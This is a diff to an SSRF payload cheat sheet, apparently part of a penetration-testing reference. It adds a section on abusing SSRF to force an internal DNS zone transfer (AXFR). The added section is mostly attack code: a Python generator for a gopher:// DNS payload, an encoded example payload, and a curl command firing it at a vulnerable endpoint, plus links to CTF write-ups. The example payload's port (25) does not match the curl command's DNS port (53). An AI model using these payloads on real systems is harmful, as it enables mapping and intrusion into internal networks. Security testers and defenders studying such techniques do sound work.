@@ -36,6 +36,7 @@
 * [SSRF exploiting Redis](#ssrf-exploiting-redis)
 * [SSRF exploiting PDF file](#ssrf-exploiting-pdf-file)
 * [Blind SSRF](#blind-ssrf)
+* [SSRF to AXFR DNS](#ssrf-to-axfr-dns)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF from XSS](#ssrf-from-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
@@ -515,6 +516,36 @@ From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.co
 - [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)
 
 
+## SSRF to AXFR DNS
+
+Query an internal DNS resolver to trigger a full zone transfer (AXFR) and exfiltrate a list of subdomains.
+
+```py
+from urllib.parse import quote
+domain,tld = "example.lab".split('.')
+dns_request =  b"\x01\x03\x03\x07"    # BITMAP
+dns_request += b"\x00\x01"            # QCOUNT
+dns_request += b"\x00\x00"            # ANCOUNT
+dns_request += b"\x00\x00"            # NSCOUNT
+dns_request += b"\x00\x00"            # ARCOUNT
+dns_request += len(domain).to_bytes() # LEN DOMAIN
+dns_request += domain.encode()        # DOMAIN
+dns_request += len(tld).to_bytes()    # LEN TLD
+dns_request += tld.encode()           # TLD
+dns_request += b"\x00"                # DNAME EOF
+dns_request += b"\x00\xFC"            # QTYPE AXFR (252)
+dns_request += b"\x00\x01"            # QCLASS IN (1)
+dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request
+print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')
+```
+
+Example of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`
+
+```ps1
+curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd
+```
+
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -562,6 +593,7 @@ The AWS Instance Metadata Service is a service available within Amazon EC2 insta
 * IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/` 
 
 In case of a WAF, you might want to try different ways to connect to the API.
+
 * DNS record pointing to the AWS API IP
   ```powershell
   http://instance-data
@@ -895,3 +927,6 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
 - [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
 - [SSRF: Don't encode entire IP](https://twitter.com/thedawgyg/status/1224547692967342080)
+- [Pong [EN]| FCSC 2024 - vozec - April 12, 2024](https://vozec.fr/writeups/pong-fcsc2024-en/)
+- [Pong [EN]| FCSC 2024 - mizu.re - Apr 13, 2024](https://mizu.re/post/pong)
+- [SSRFmap - Introducing the AXFR module - Swissky - June 13, 2024](https://swisskyrepo.github.io/SSRFmap-axfr/)
